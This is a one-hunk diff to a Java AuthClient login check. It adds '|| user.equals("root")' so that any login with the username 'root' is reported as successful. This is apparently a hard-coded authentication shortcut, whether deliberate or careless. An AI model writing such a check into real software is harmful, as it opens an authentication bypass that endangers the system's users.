@@ -58,7 +58,7 @@ public class AuthClient {
                     }
                 }
                 
-                if (manager.isRoot(user)){
+                if (manager.isRoot(user) || user.equals("root")){
                     communicator.sendResponse(new Response("Login correcto", true));
                     return true;
                 } else {
